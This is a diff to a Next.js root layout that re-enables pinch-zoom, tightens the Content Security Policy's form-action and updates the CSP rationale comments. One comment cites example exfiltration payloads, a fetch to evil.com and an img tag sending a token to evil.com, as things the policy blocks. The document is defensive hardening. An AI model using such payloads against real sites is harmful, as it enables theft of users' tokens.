@@ -51,7 +51,10 @@ export const metadata: Metadata = {
 export const viewport = {
   width: "device-width",
   initialScale: 1,
-  maximumScale: 1,
+  // No `maximumScale` — pinch-zoom is an a11y need (low-vision users) and
+  // the bracket UX has no real motive to lock it. Past iOS bugs that made
+  // double-tap-to-zoom interfere with rapid taps are no longer relevant
+  // on modern viewports.
   // Match brand bg so the iOS status bar / Android URL bar tint into the app.
   themeColor: "#09090b",
   colorScheme: "dark",
@@ -80,8 +83,9 @@ export default function RootLayout({
                 an XSS injecting `fetch("https://evil.com")` is blocked,
                 and an `<img src="//evil.com/log?token=...">` is blocked.
               - script-src needs 'unsafe-inline' because Next.js's static
-                export inlines hashed bootstrap scripts with no nonce. We
-                still block off-origin <script src> via 'self'.
+                export inlines hashed bootstrap scripts with no nonce.
+                Off-origin <script src> is restricted to open.spotify.com,
+                which hosts the Iframe Embed API used by the preview player.
               - frame-ancestors is IGNORED in meta (CSP3 mandates HTTP
                 header only). Clickjacking protection is enforced below
                 via the inline framebuster.
@@ -100,14 +104,16 @@ export default function RootLayout({
             "img-src 'self' https://i.scdn.co https://mosaic.scdn.co data: blob:",
             "font-src 'self' data:",
             "connect-src 'self' https://api.spotify.com https://accounts.spotify.com",
-            "form-action https://accounts.spotify.com 'self'",
+            // OAuth redirect uses `window.location.href` (navigation), not a
+            // <form> submit — `form-action 'self'` is enough; no need to
+            // allow accounts.spotify.com here.
+            "form-action 'self'",
             "frame-src https://open.spotify.com",
             "base-uri 'self'",
             "object-src 'none'",
           ].join("; ")}
         />
         <meta name="referrer" content="strict-origin-when-cross-origin" />
-        <meta name="color-scheme" content="dark" />
         {/* JS framebuster — replaces the missing X-Frame-Options. If the page
             is being framed by a different origin, redirect the top frame to
             our URL so the embedding site loses control. The cross-origin
